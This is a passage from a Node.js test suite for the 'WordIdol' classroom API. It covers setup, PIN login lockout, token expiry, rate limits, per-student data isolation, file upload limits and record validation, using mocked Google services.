#!/usr/bin/env node
// WordIdol API tests (SPEC §15.4 "API"): Code.gs + Shared.gs (or the sources) in Node with the stubs of
// tests/api.mock.js. Every action's happy path, the listed errors, SPEC §14.2 P2 P3 P6 P8 P9 P10,
// lockout and expiry, idempotent replays, two interleaved writers. Owner: W1.
//   node tests/api.test.js            (uses Shared.gs if it is up to date, else the source files)
//   node tests/api.test.js --sources  (always the source files)
'use strict';
// The server must never depend on the machine's time zone: run every test far from Bangkok.
process.env.TZ = 'America/New_York';
var assert = require('assert');
var M = require('./api.mock.js');

var USE_SOURCES = process.argv.indexOf('--sources') >= 0;
var results = [];
function test(name, fn) {
  try { fn(); results.push({ name: name, ok: true }); }
  catch (e) { results.push({ name: name, ok: false, err: e }); }
}
function fresh(start) {
  var env = M.createEnv({ start: start || '2026-11-21T09:00:00+07:00', useSources: USE_SOURCES });
  env.setup();
  return env;
}
function ok(r, msg) { if (!r.ok) throw new Error((msg || 'expected ok') + ': ' + JSON.stringify(r.error)); return r.data; }
function bad(r, code, msg) {
  if (r.ok) throw new Error((msg || 'expected ' + code) + ' but got ok');
  if (r.error.code !== code) throw new Error((msg || 'expected ' + code) + ' but got ' + r.error.code + ' (' + r.error.message + ')');
  return r.error;
}
function login(env, id, pin) { return ok(env.post('login', { studentId: id, pin: pin }), 'login ' + id).token; }
function tlogin(env) { return ok(env.post('t.login', { pin: '123456' }), 't.login').token; }
var seq = 0;
function rid(prefix) { seq++; return prefix + '_' + ('t' + seq.toString(36)).padStart(12, 'z'); }

var FIRST = { word: 'vronk', meaning: 'a sudden problem at the worst moment', example1: 'That was a total vronk.', pos: 'noun', posConfirmed: true };
var CARD = { usageRules: 'A countable noun; friends use it when plans go wrong.', formation: 'coinage', sourceWords: 'invented sound', example2: 'My phone died, a real vronk.', example3: 'Another vronk at lunch today.', purpose: 'To name a sudden problem in one short word.', notRudeConfirmed: true };
var ZB = { checkedAt: '2026-11-12', statement: 'I found no results with my meaning anywhere.', places: ['zb_google', 'zb_tiktok', 'zb_instagram', 'zb_x', 'zb_youtube', 'zb_urban'].map(function (p) { return { placeId: p, result: 'none', note: '' }; }) };
var CHOICES = { targetGroups: ['tg_school'], ideas: ['id_speak', 'id_tiktok'], platforms: ['pf_tiktok'], route: 'utility', timeBudget: 'standard', who: 'My friends in the school choir group.', why: 'We need a short word for sudden problems.', what: 'They will hear it when things go wrong.' };
function rules(env, tok) { return ok(env.post('rules.tick', { ticks: [true, true, true, true, true, true] }, tok)); }
function planAction(env, tok, extra) {
  var rec = Object.assign({ id: rid('pa'), where: 'ch_school', ideaId: 'id_speak', what: 'Use it at lunch with friends', why: 'They meet every day', whenDate: '2026-11-23', evidence: 'log' }, extra || {});
  return ok(env.post('rec.save', { type: 'planAction', record: rec }, tok), 'planAction').record;
}
function fullStart(env, tok) {
  ok(env.post('word.save', { fields: FIRST }, tok), 'first');
  ok(env.post('word.save', { fields: CARD }, tok), 'card');
  ok(env.post('word.zb', { zb: ZB }, tok), 'zb');
  ok(env.post('plan.save', { phase: 1, fields: CHOICES }, tok), 'plan');
  rules(env, tok);
  planAction(env, tok); planAction(env, tok); planAction(env, tok);
}
function action(env, tok, extra) {
  var rec = Object.assign({ id: rid('ac'), date: '2026-11-21', channelId: 'ch_school', what: 'Used my word at lunch with two friends', outcome: 'as_planned' }, extra || {});
  return env.post('rec.save', { type: 'action', record: rec }, tok);
}
function sighting(env, tok, extra) {
  var rec = Object.assign({ id: rid('sg'), date: '2026-11-21', channelId: 'ch_school', relation: 'classmate', quote: 'What a vronk!', prompted: 'unasked', marked: 'natural', topic: 'school', posUsed: 'noun', level: 4, verifiable: true }, extra || {});
  return env.post('rec.save', { type: 'sighting', record: rec }, tok);
}
function upload(env, tok, extra, size, seed) {
  return env.post('file.upload', Object.assign({ dataBase64: M.fakeJpeg(size || 3000, seed || 9), width: 800, height: 600, attachType: 'none', attachId: '', caption: 'test', cropConfirmed: true }, extra || {}), tok);
}

// ------------------------------------------------------------------- setup
test('setup: 26 tabs with exact headers, frozen; default tab removed; Config defaults; folder', function () {
  var env = fresh();
  var ss = env.svc._ss;
  var S = env.ctx.WI_SCHEMA;
  assert.strictEqual(Object.keys(S.tabs).length, 26);
  Object.keys(S.tabs).forEach(function (t) {
    var sh = ss.getSheetByName(t);
    assert.ok(sh, 'tab ' + t);
    assert.strictEqual(JSON.stringify(sh.getRange(1, 1, 1, S.tabs[t].length).getValues()[0]), JSON.stringify(S.tabs[t]), 'header ' + t);
    assert.strictEqual(sh.getFrozenRows(), 1);
  });
  assert.ok(!ss.getSheetByName('Sheet1'), 'empty default tab deleted');
  var cfg = {}; env.rows('Config').forEach(function (r) { cfg[r.key] = r.value; });
  assert.strictEqual(cfg.release, '1'); assert.strictEqual(cfg.onlineOpensAt, '2026-11-26T16:30:00+07:00'); assert.strictEqual(cfg.boardEnabled, 'TRUE');
  assert.ok(env.svc._props.evidenceFolderId, 'evidence folder created');
  assert.ok(env.openedIds.every(function (i) { return i === '1ILusw6kHxaCcx6kesjjO9tZ3pc9mr0-tSYvpnK8rEGY'; }));
  env.setup(); // second run keeps everything
  assert.strictEqual(ss.getSheets().length, 26);
});

test('installTriggers: one Monday 00:10 trigger in Asia/Bangkok; wiSelfTest logs ok', function () {
  var env = fresh();
  env.ctx.installTriggers(); env.ctx.installTriggers();
  var tr = env.svc._triggers();
  assert.strictEqual(tr.length, 1);
  assert.strictEqual(tr[0].fn, 'weeklyJob'); assert.strictEqual(tr[0].day, 'MONDAY'); assert.strictEqual(tr[0].hour, 0); assert.strictEqual(tr[0].minute, 10); assert.strictEqual(tr[0].tz, 'Asia/Bangkok');
  var r = env.ctx.wiSelfTest();
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.ok(/"ok":true/.test(env.svc._logs[env.svc._logs.length - 1]));
});

// ---------------------------------------------------------- P2, transport
test('P2: without a token only ping and roster answer; roster gives id, label, guest only', function () {
  var env = fresh();
  var p = ok(env.get('ping'));
  assert.ok(p.version);
  var ro = ok(env.get('roster'));
  assert.strictEqual(ro.students.length, 11);
  ro.students.forEach(function (s) { assert.deepStrictEqual(Object.keys(s).sort(), ['guest', 'id', 'label']); });
  var acts = env.ctx.WI_SCHEMA.actions;
  var handlers = Object.keys(env.ctx.HANDLERS_).sort();
  assert.strictEqual(JSON.stringify(handlers), JSON.stringify(Object.keys(acts).sort()), 'every SPEC §8.3 action has a handler, and no other');
  assert.strictEqual(handlers.length, 47);
  Object.keys(acts).forEach(function (a) {
    if (acts[a].auth === 'P') return;
    bad(env.post(a, {}), 'AUTH_REQUIRED', a);
    bad(env.post(a, {}, 'f'.repeat(64)), 'AUTH_REQUIRED', a + ' fake token');
  });
  bad(env.get('bootstrap'), 'VALIDATION');
  bad(env.post('ping', {}), 'VALIDATION');
  bad(env.post('no.such', {}), 'NOT_FOUND');
  var r = env.postRaw('not json');
  bad(r, 'VALIDATION');
  assert.strictEqual(typeof r.now, 'string');
});

test('LIMIT: request body over 900 KB is refused', function () {
  var env = fresh();
  var tok = login(env, 'g1', '1111');
  var big = JSON.stringify({ action: 'rec.save', token: tok, data: { type: 'journal', record: { text: 'x'.repeat(950 * 1024) } } });
  bad(env.postRaw(big), 'LIMIT');
});

// ------------------------------------------------------------- auth
test('login: bad PIN counts down; 5th wrong PIN locks for 5 minutes; correct PIN then refused; clears after', function () {
  var env = fresh();
  for (var i = 1; i <= 4; i++) {
    var e = bad(env.post('login', { studentId: 's01', pin: '9999' }), 'AUTH_BAD_PIN');
    assert.strictEqual(e.data.triesLeft, 5 - i);
    assert.ok(/Tries left: \d\./.test(e.message));
  }
  var l = bad(env.post('login', { studentId: 's01', pin: '9999' }), 'AUTH_LOCKED');
  assert.ok(l.data.retryAt);
  bad(env.post('login', { studentId: 's01', pin: '0001' }), 'AUTH_LOCKED', '6th try with the right PIN');
  env.advance(4 * 60000);
  bad(env.post('login', { studentId: 's01', pin: '0001' }), 'AUTH_LOCKED');
  env.advance(61000);
  ok(env.post('login', { studentId: 's01', pin: '0001' }));
  // Another student is not affected
  ok(env.post('login', { studentId: 's02', pin: '0002' }));
  bad(env.post('login', { studentId: 'nobody', pin: '0001' }), 'VALIDATION');
  bad(env.post('login', { studentId: 's02', pin: '00a2' }), 'AUTH_BAD_PIN');
});

test('login: wrong PINs spread over more than 15 minutes do not lock; a lock does not sign her out', function () {
  var env = fresh();
  var tok = login(env, 's03', '0003');
  for (var i = 0; i < 4; i++) { bad(env.post('login', { studentId: 's03', pin: '1234' }), 'AUTH_BAD_PIN'); env.advance(5 * 60000); }
  var e = bad(env.post('login', { studentId: 's03', pin: '1234' }), 'AUTH_BAD_PIN');
  assert.ok(e.data.triesLeft >= 1);
  ok(env.post('bootstrap', {}, tok));
  for (var j = 0; j < 4; j++) env.post('login', { studentId: 's03', pin: '1234' });
  ok(env.post('bootstrap', {}, tok)); // lead decision 19 Nov: a lock blocks new sign-ins only
  bad(env.post('login', { studentId: 's03', pin: '0003' }), 'AUTH_LOCKED');
});

test('teacher: t.login PIN 6–8 digits, lockout 15 minutes; roles are enforced both ways', function () {
  var env = fresh();
  for (var i = 0; i < 4; i++) bad(env.post('t.login', { pin: '000000' }), 'AUTH_BAD_PIN');
  bad(env.post('t.login', { pin: '000000' }), 'AUTH_LOCKED');
  env.advance(14 * 60000);
  bad(env.post('t.login', { pin: '123456' }), 'AUTH_LOCKED');
  env.advance(61000);
  var tt = tlogin(env);
  var st = login(env, 'g1', '1111');
  var acts = env.ctx.WI_SCHEMA.actions;
  Object.keys(acts).forEach(function (a) {
    if (acts[a].auth === 'T') bad(env.post(a, {}, st), 'FORBIDDEN', 'student token on ' + a);
    if (acts[a].auth === 'S') bad(env.post(a, {}, tt), 'FORBIDDEN', 'teacher token on ' + a);
  });
});

test('expiry: student 30 days from last use (sliding); teacher 12 hours; logout revokes', function () {
  var env = fresh();
  var tok = login(env, 'g2', '2222');
  env.advance(20 * 86400000); ok(env.post('bootstrap', {}, tok));
  env.advance(25 * 86400000); ok(env.post('bootstrap', {}, tok), 'still valid 25 days after last use');
  env.advance(31 * 86400000); bad(env.post('bootstrap', {}, tok), 'AUTH_REQUIRED');
  var tt = tlogin(env);
  env.advance(11 * 3600000); ok(env.post('t.overview', {}, tt));
  env.advance(2 * 3600000); bad(env.post('t.overview', {}, tt), 'AUTH_REQUIRED');
  var t2 = login(env, 'g2', '2222');
  ok(env.post('logout', {}, t2));
  bad(env.post('bootstrap', {}, t2), 'AUTH_REQUIRED');
});

test('no PIN or token is stored or logged; Sessions holds only SHA-256 hashes', function () {
  var env = fresh();
  var tok = login(env, 's05', '0005');
  env.post('login', { studentId: 's05', pin: '4321' });
  ok(env.post('bootstrap', {}, tok));
  var tt = tlogin(env);
  ok(env.post('t.pin', { studentId: 's06', newPin: '8642' }, tt));
  var all = '';
  env.svc._ss.getSheets().forEach(function (sh) { all += JSON.stringify(sh.getDataRange().getValues()); });
  all += JSON.stringify(env.svc._props) + env.svc._logs.join('\n');
  [tok, tt, '0005', '4321', '123456', '8642'].forEach(function (s) { assert.ok(all.indexOf(s) < 0, 'leaked ' + s.slice(0, 6)); });
  var logs = env.rows('Log');
  assert.ok(logs.length > 3);
  logs.forEach(function (r) { assert.deepStrictEqual(Object.keys(r), ['at', 'who', 'role', 'action', 'ok', 'errorCode', 'ms']); });
  env.rows('Sessions').forEach(function (s) { assert.ok(/^[0-9a-f]{64}$/.test(s.tokenHash)); });
});

test('RATE: more than 60 calls a minute on one token', function () {
  var env = fresh();
  var tok = login(env, 'g3', '3333');
  for (var i = 0; i < 60; i++) ok(env.post('board.get', {}, tok));
  bad(env.post('board.get', {}, tok), 'RATE');
  env.advance(61000);
  ok(env.post('board.get', {}, tok));
});

test('BUSY: lock timeout on a write; reads still answer', function () {
  var env = fresh();
  var tok = login(env, 'g1', '1111');
  env.lockBusy = true;
  bad(env.post('word.save', { fields: FIRST }, tok), 'BUSY');
  ok(env.post('board.get', {}, tok));
  env.lockBusy = false;
  ok(env.post('word.save', { fields: FIRST }, tok));
});

// ------------------------------------------------------------ word, plan, rules
test('first step: validation, server-side guess, XP X01 and badge B01; bootstrap bundle shape', function () {
  var env = fresh();
  var tok = login(env, 'g1', '1111');
  var b = ok(env.post('bootstrap', {}, tok));
  ['student', 'state', 'config', 'word', 'wordHistory', 'plans', 'planActions', 'checklist', 'reviews', 'actions', 'journal', 'sightings', 'tallies', 'files', 'waves', 'waveNotes', 'requests', 'flags', 'feedback', 'reports', 'summit', 'article', 'audits', 'xpLog'].forEach(function (k) { assert.ok(k in b, 'bundle has ' + k); });
  assert.ok(Array.isArray(b.audits.mine) && Array.isArray(b.audits.onMe));
  assert.ok(b.checklist.length > 0, 'W01 checklist built');
  assert.ok(b.checklist.every(function (r) { return r.id.indexOf('g1|W01|') === 0; }));
  bad(env.post('word.save', { fields: Object.assign({}, FIRST, { example1: 'I love my new shoes today.' }) }, tok), 'VALIDATION');
  var e = bad(env.post('word.save', { fields: Object.assign({}, FIRST, { word: 'v' }) }, tok), 'VALIDATION');
  assert.strictEqual(e.field, 'word');
  bad(env.post('word.save', { fields: Object.assign({}, FIRST, { pos: 'banana' }) }, tok), 'VALIDATION');
  bad(env.post('word.save', { fields: Object.assign({}, FIRST, { meaning: 'short' }) }, tok), 'VALIDATION');
  var r = ok(env.post('word.save', { fields: Object.assign({}, FIRST, { posGuess: 'verb', regStatus: 'approved' }) }, tok));
  assert.strictEqual(r.word.posGuess, 'noun'); assert.strictEqual(r.word.posRule, 'P10'); assert.strictEqual(r.word.posConfidence, 'high');
  assert.strictEqual(r.word.regStatus, 'draft', 'client cannot set regStatus');
  assert.ok(r.gained.some(function (g) { return g.ruleId === 'X01' && g.xp === 20; }), 'X01');
  assert.ok(r.gained.some(function (g) { return g.badgeId === 'B01'; }), 'B01');
  assert.strictEqual(r.state.xp >= 20, true);
  var again = ok(env.post('word.save', { fields: FIRST }, tok));
  assert.ok(!again.gained.some(function (g) { return g.ruleId === 'X01'; }), 'X01 once');
  assert.strictEqual(env.rows('Words').length, 1);
});

test('word card, zero-baseline, submit, approval, word change history (SPEC §3.4, §13.2)', function () {
  var env = fresh();
  var tok = login(env, 's01', '0001'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, tok));
  bad(env.post('word.submit', {}, tok), 'VALIDATION', 'card missing');
  bad(env.post('word.save', { fields: Object.assign({}, CARD, { example2: 'This sentence lacks it.' }) }, tok), 'VALIDATION');
  bad(env.post('word.save', { fields: Object.assign({}, CARD, { notRudeConfirmed: false }) }, tok), 'VALIDATION');
  ok(env.post('word.save', { fields: CARD }, tok));
  var e = bad(env.post('word.submit', {}, tok), 'VALIDATION');
  assert.strictEqual(e.field, 'zb');
  bad(env.post('word.zb', { zb: Object.assign({}, ZB, { checkedAt: '2026-12-30' }) }, tok), 'VALIDATION', 'future date');
  bad(env.post('word.zb', { zb: { places: [{ placeId: 'zb_moon', result: 'none' }] } }, tok), 'VALIDATION');
  ok(env.post('word.zb', { zb: ZB }, tok));
  var s = ok(env.post('word.submit', {}, tok));
  assert.strictEqual(s.word.regStatus, 'submitted');
  bad(env.post('t.term', { studentId: 's01', decision: 'changes' }, tt), 'VALIDATION', 'changes needs a comment');
  var ap = ok(env.post('t.term', { studentId: 's01', decision: 'approved' }, tt));
  assert.strictEqual(ap.word.regStatus, 'approved');
  var ch = ok(env.post('word.save', { fields: { meaning: 'a sudden small disaster at a bad time' } }, tok));
  assert.strictEqual(ch.word.regStatus, 'submitted');
  var h = env.rows('WordHistory');
  assert.strictEqual(h.length, 1); assert.strictEqual(h[0].field, 'meaning');
  var rq = env.rows('Requests');
  assert.strictEqual(rq.length, 1); assert.strictEqual(rq[0].type, 'word_change'); assert.strictEqual(rq[0].status, 'pending');
  var ov = ok(env.post('t.overview', {}, tt));
  assert.ok(ov.pending.terms >= 1 && ov.pending.requests >= 1);
  ok(env.post('t.term', { studentId: 's01', decision: 'approved' }, tt));
  assert.strictEqual(env.rows('Requests')[0].status, 'approved');
  // FUDGE, hypotheses, spec sheet
  var fudge = { pred: { F: 2, U: 1, D: 1, G: 0, E: 2, reasons: { F: 'People say it daily', U: 'Short and easy', D: 'Only my class so far', G: 'No new forms yet', E: 'Problems never stop' } } };
  bad(env.post('word.save', { fields: { fudge: { pred: Object.assign({}, fudge.pred, { F: 3 }) } } }, tok), 'VALIDATION');
  var wf = ok(env.post('word.save', { fields: { fudge: fudge, researchQuestion: 'To what extent will my class use vronk?', hypotheses: [{ text: 'Recognition will rise above ten per cent by Wave 2.', metric: 'recognition', target: '10% by Wave 2' }, { text: 'Friends outside class will use it without being asked.', metric: 'level' }], specSheet: { R1: { result: 'pass', note: '' } } } }, tok));
  assert.strictEqual(wf.word.hypotheses[1].id, 'h2'); assert.ok(wf.word.fudge.pred.at);
  bad(env.post('word.save', { fields: { hypotheses: [1, 2, 3, 4, 5].map(function () { return { text: 'A long enough hypothesis text here.', metric: 'other' }; }) } }, tok), 'VALIDATION');
  bad(env.post('word.save', { fields: { specSheet: { R11: { result: 'pass' } } } }, tok), 'VALIDATION');
});

test('plan, P10 ask T.Chris first, rules: validation and approval unlock', function () {
  var env = fresh();
  var tok = login(env, 's02', '0002'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, tok));
  bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { platforms: ['pf_inperson', 'pf_tiktok'] }) }, tok), 'VALIDATION');
  bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { ideas: ['id_tiktok'] }) }, tok), 'VALIDATION', 'needs an in-person idea');
  var e = bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { ideas: ['id_speak', 'id_influencer'] }) }, tok), 'VALIDATION', 'P10 choose');
  assert.strictEqual(e.field, 'ideas');
  bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { platforms: ['pf_other'] }) }, tok), 'VALIDATION', 'platformOther');
  bad(env.post('plan.save', { phase: 2, fields: CHOICES }, tok), 'RELEASE');
  var p = ok(env.post('plan.save', { phase: 1, fields: CHOICES }, tok));
  assert.strictEqual(p.plan.id, 's02-p1');
  bad(env.post('rec.save', { type: 'planAction', record: { id: rid('pa'), where: 'ch_school', ideaId: 'id_influencer', what: 'Ask a big account to post', why: 'Reach many people', whenDate: '2026-11-25', evidence: 'log' } }, tok), 'VALIDATION', 'P10 plan');
  bad(env.post('request.create', { type: 'ask_first', ideaId: 'id_influencer', text: 'short' }, tok), 'VALIDATION');
  var rq = ok(env.post('request.create', { type: 'ask_first', ideaId: 'id_influencer', text: 'Can I ask my cousin, who has a big account, to use the word?' }, tok));
  var rq2 = ok(env.post('request.create', { type: 'ask_first', ideaId: 'id_influencer', text: 'Can I ask my cousin, who has a big account, to use the word?' }, tok));
  assert.strictEqual(rq.request.id, rq2.request.id, 'replay = same row');
  ok(env.post('t.request', { id: rq.request.id, decision: 'approved', comment: 'Yes, in person first.' }, tt));
  ok(env.post('plan.save', { phase: 1, fields: { ideas: ['id_speak', 'id_influencer'] } }, tok));
  planAction(env, tok, { ideaId: 'id_influencer', where: 'ch_instagram' });
  bad(env.post('rules.tick', { ticks: [true, true, true, true, true, false] }, tok), 'VALIDATION');
  var rt = rules(env, tok);
  assert.ok(rt.gained.some(function (g) { return g.ruleId === 'X05'; }));
  assert.ok(rt.state.rulesTicked.every(function (x) { return !!x; }));
});

// --------------------------------------------------------------- P9, online gate
test('P9: online action refused until six rules AND onlineOpensAt, or teacher unlock; teacher can lock again', function () {
  var env = fresh('2026-11-24T10:00:00+07:00');
  var tok = login(env, 's03', '0003'), tt = tlogin(env);
  ok(env.post('word.save', { fields: FIRST }, tok));
  bad(action(env, tok, { channelId: 'ch_tiktok', date: '2026-11-24' }), 'LOCKED_ONLINE', 'before rules');
  ok(action(env, tok, { channelId: 'ch_school', date: '2026-11-24' }), 'in person is fine');
  ok(sighting(env, tok, { channelId: 'ch_tiktok', relation: 'classmate', date: '2026-11-24' }), 'someone else online: always ok');
  bad(sighting(env, tok, { channelId: 'ch_tiktok', relation: 'me', date: '2026-11-24' }), 'LOCKED_ONLINE', 'her own online use');
  rules(env, tok);
  bad(action(env, tok, { channelId: 'ch_tiktok', date: '2026-11-24' }), 'LOCKED_ONLINE', 'rules but before 26 Nov 16:30');
  env.setNow('2026-11-26T16:29:00+07:00');
  bad(action(env, tok, { channelId: 'ch_tiktok', date: '2026-11-26' }), 'LOCKED_ONLINE');
  env.setNow('2026-11-26T16:31:00+07:00');
  var a = ok(action(env, tok, { channelId: 'ch_tiktok', date: '2026-11-26' }), 'auto unlock');
  assert.strictEqual(a.state.onlineUnlocked, true); assert.strictEqual(a.state.onlineUnlockedBy, 'auto');
  tt = tlogin(env);
  ok(env.post('t.online', { studentId: 's03', unlocked: false }, tt));
  bad(action(env, tok, { channelId: 'ch_tiktok', date: '2026-11-26' }), 'LOCKED_ONLINE', 'teacher locked again');
  // Early unlock by the teacher for another student, before her rules and the date.
  env.setNow('2026-11-24T10:00:00+07:00');
  var t4 = login(env, 's04', '0004');
  ok(env.post('t.online', { studentId: 's04', unlocked: true }, tt));
  bad(action(env, t4, { channelId: 'ch_chat', date: '2026-11-24' }), 'LOCKED_ONLINE', 'a teacher unlock still needs the six rules');
  ok(env.post('rules.tick', { ticks: [true, true, true, true, true, true] }, t4));
  ok(action(env, t4, { channelId: 'ch_chat', date: '2026-11-24' }), 'teacher unlock wins over the date');
  var ov = ok(env.post('t.overview', {}, tt));
  var row = ov.rows.filter(function (r) { return r.studentId === 's04'; })[0];
  assert.strictEqual(row.online, 'teacher');
});

// ----------------------------------------------------------- P3 scope
test('P3: a student token never reads or changes another student’s rows', function () {
  var env = fresh();
  var ta = login(env, 's01', '0001'), tb = login(env, 's02', '0002'), tt = tlogin(env);
  fullStart(env, ta);
  var acId = rid('ac');
  ok(action(env, ta, { id: acId }));
  var sg = ok(sighting(env, ta)).record;
  var f = ok(upload(env, ta, { attachType: 'sighting', attachId: sg.id })).file;
  var fb = ok(env.post('t.feedback', { studentId: 's01', targetType: 'general', text: 'Great start, Student A.' }, tt)).feedback;
  var rowA = ok(env.post('bootstrap', {}, ta)).checklist[0];
  // B's bundle has none of A's data, even if she names A in the body.
  var bb = ok(env.post('bootstrap', { studentId: 's01' }, tb));
  var s = JSON.stringify(bb);
  [acId, sg.id, f.id, fb.id, 'vronk', 's01|'].forEach(function (x) { assert.ok(s.indexOf(x) < 0, 'B sees ' + x); });
  assert.strictEqual(bb.student.id, 's02');
  bad(action(env, tb, { id: acId, what: 'Overwrite A entry here please' }), 'FORBIDDEN');
  bad(env.post('rec.delete', { type: 'action', id: acId }, tb), 'FORBIDDEN');
  bad(env.post('rec.delete', { type: 'sighting', id: sg.id }, tb), 'FORBIDDEN');
  bad(env.post('checklist.tick', { rowId: rowA.id, done: true }, tb), 'FORBIDDEN');
  bad(env.post('checklist.setStatus', { rowId: rowA.id, status: 'cannot', reason: 'Not my row at all.' }, tb), 'FORBIDDEN');
  bad(env.post('file.get', { id: f.id }, tb), 'FORBIDDEN');
  bad(env.post('file.update', { id: f.id, caption: 'x' }, tb), 'FORBIDDEN');
  bad(env.post('file.delete', { id: f.id }, tb), 'FORBIDDEN');
  bad(env.post('feedback.read', { id: fb.id }, tb), 'FORBIDDEN');
  bad(upload(env, tb, { attachType: 'sighting', attachId: sg.id }), 'FORBIDDEN', 'attach to A entry');
  // word.save from B writes B's row only
  ok(env.post('word.save', { studentId: 's01', fields: Object.assign({}, FIRST, { word: 'blorp', example1: 'Blorp it before the teacher sees.' }) }, tb));
  var words = env.rows('Words');
  assert.strictEqual(words.filter(function (w) { return w.studentId === 's01'; })[0].word, 'vronk');
  assert.strictEqual(words.filter(function (w) { return w.studentId === 's02'; })[0].word, 'blorp');
  // A's rows unchanged
  assert.strictEqual(env.rows('Actions').filter(function (r) { return r.id === acId; })[0].studentId, 's01');
});

// --------------------------------------------------------------- files, P6, P8
test('files: crop tick, JPEG only, size, private Drive folder per label, owner or teacher only (P6)', function () {
  var env = fresh();
  var tok = login(env, 'g1', '1111'), tt = tlogin(env), other = login(env, 'g2', '2222');
  var e = bad(upload(env, tok, { cropConfirmed: false }), 'VALIDATION');
  assert.ok(e.message.indexOf("I have cropped out other people's names, faces and usernames.") >= 0);
  bad(upload(env, tok, { dataBase64: Buffer.from('GIF89a not a jpeg at all').toString('base64') }), 'VALIDATION');
  bad(upload(env, tok, {}, 601 * 1024), 'LIMIT');
  bad(upload(env, tok, { width: 2000 }), 'VALIDATION');
  var f = ok(upload(env, tok, { caption: 'TERM_google_20261112' })).file;
  assert.ok(!('driveFileId' in f));
  var d = env.svc._drive;
  var df = Object.keys(d.files).map(function (k) { return d.files[k]; })[0];
  assert.strictEqual(df._name, f.id + '.jpg');
  assert.strictEqual(df._parent._name, 'Guest#1');
  assert.strictEqual(df._parent._parent._name, 'WordIdol Evidence');
  var g = ok(env.post('file.get', { id: f.id }, tok));
  assert.ok(/^data:image\/jpeg;base64,\/9j\//.test(g.dataUrl));
  ok(env.post('t.file', { id: f.id }, tt));
  bad(env.post('file.get', { id: f.id }, other), 'FORBIDDEN');
  var again = ok(upload(env, tok, { caption: 'TERM_google_20261112' })).file;
  assert.strictEqual(again.id, f.id, 'replayed upload = same row');
  assert.strictEqual(env.rows('Files').length, 1);
  var up = ok(env.post('file.update', { id: f.id, caption: 'New caption', inSummit: true }, tok));
  assert.strictEqual(up.file.inSummit, true);
  // Drive file not private → refused and binned
  env.defaultAccess = 'ANYONE_WITH_LINK';
  bad(upload(env, tok, {}, 3000, 33), 'SERVER');
  env.defaultAccess = 'PRIVATE';
  assert.strictEqual(env.rows('Files').length, 1);
  ok(env.post('file.delete', { id: f.id }, tok));
  assert.strictEqual(df.isTrashed(), true);
  bad(env.post('file.get', { id: f.id }, tok), 'NOT_FOUND');
});

test('P8: the 81st upload is refused; 3 per entry (6 for zero-baseline); deleting frees a place', function () {
  var env = fresh();
  var tok = login(env, 'g3', '3333');
  var sgId = rid('sg');
  for (var k = 0; k < 3; k++) ok(upload(env, tok, { attachType: 'sighting', attachId: sgId }, 1500, 100 + k));
  bad(upload(env, tok, { attachType: 'sighting', attachId: sgId }, 1500, 104), 'LIMIT', '4th on one entry');
  for (var z = 0; z < 6; z++) ok(upload(env, tok, { attachType: 'zb' }, 1500, 120 + z));
  bad(upload(env, tok, { attachType: 'zb' }, 1500, 127), 'LIMIT', '7th zero-baseline');
  var last;
  for (var i = 9; i < 80; i++) { env.advance(1500); last = ok(upload(env, tok, {}, 1500, 200 + i)).file; }
  var st = ok(env.post('bootstrap', {}, tok)).state;
  assert.strictEqual(st.fileCount, 80);
  bad(upload(env, tok, {}, 1500, 999), 'LIMIT', '81st');
  ok(env.post('file.delete', { id: last.id }, tok));
  ok(upload(env, tok, {}, 1500, 998), 'a place is free again');
});

// ------------------------------------------------------------ records
test('records: action, journal, sighting, tally, planAction save, upsert by id, delete; server fields', function () {
  var env = fresh('2026-11-22T12:00:00+07:00');
  var tok = login(env, 'g1', '1111');
  fullStart(env, tok);
  var pa = planAction(env, tok);
  assert.strictEqual(pa.status, 'planned'); assert.strictEqual(pa.weekId, 'W02');
  bad(env.post('rec.save', { type: 'planAction', record: { id: rid('pa'), where: 'ch_school', ideaId: 'id_poem', what: 'Write a poem with it', why: 'Poems are fun', whenDate: '2026-11-25', evidence: 'log' } }, tok), 'VALIDATION', 'idea not chosen');
  bad(env.post('rec.save', { type: 'planAction', record: { id: rid('pa'), where: 'ch_school', ideaId: 'id_speak', what: 'Too late in the plan', why: 'Just because', whenDate: '2027-02-01', evidence: 'log' } }, tok), 'VALIDATION', 'whenDate range');
  var acId = rid('ac');
  bad(action(env, tok, { id: acId, date: '2026-11-23' }), 'VALIDATION', 'future date');
  bad(action(env, tok, { id: acId, date: '2026-11-15' }), 'VALIDATION', 'before 16 Nov');
  bad(action(env, tok, { id: acId, outcome: 'changed' }), 'VALIDATION', 'reason needed');
  bad(action(env, tok, { id: 'ac_short' }), 'VALIDATION', 'bad id');
  var a = ok(action(env, tok, { id: acId, planActionId: pa.id, outcome: 'changed', outcomeReason: 'It rained so we stayed inside.', learned: 'People copy a word more when they hear it twice from different friends.' }));
  assert.strictEqual(a.record.weekId, 'W01'); assert.strictEqual(a.record.phase, 1);
  assert.ok(a.gained.some(function (g) { return g.ruleId === 'X06'; }));
  assert.strictEqual(env.rows('PlanActions').filter(function (r) { return r.id === pa.id; })[0].status, 'changed');
  ok(action(env, tok, { id: acId, planActionId: pa.id, outcome: 'as_planned', what: 'Used my word at lunch, edited later' }));
  assert.strictEqual(env.rows('Actions').length, 1, 'upsert');
  var j = ok(env.post('rec.save', { type: 'journal', record: { id: rid('jn'), date: '2026-11-22', kind: 'reflection', text: 'Today I used my word three times at lunch. Two friends laughed and one asked what it meant. I did not explain it, as the guide says.' } }, tok));
  assert.strictEqual(j.record.wordCount, 27);
  bad(env.post('rec.save', { type: 'journal', record: { id: rid('jn'), date: '2026-11-22', kind: 'reflection', text: 'too short' } }, tok), 'VALIDATION');
  var s = ok(sighting(env, tok, { relation: 'me', level: 1 })).record;
  assert.strictEqual(s.owned, true); assert.strictEqual(s.auditStatus, 'none');
  var s2 = ok(sighting(env, tok, { prompted: 'asked' })).record;
  assert.strictEqual(s2.owned, true);
  var s3 = ok(sighting(env, tok, { auditStatus: 'agreed', finalLevel: 6, owned: true })).record;
  assert.strictEqual(s3.owned, false); assert.strictEqual(s3.auditStatus, 'none'); assert.strictEqual(s3.finalLevel, null);
  bad(sighting(env, tok, { level: 2 }), 'VALIDATION', 'level 2 comes from the survey');
  bad(sighting(env, tok, { link: 'http://example.com' }), 'VALIDATION', 'https only');
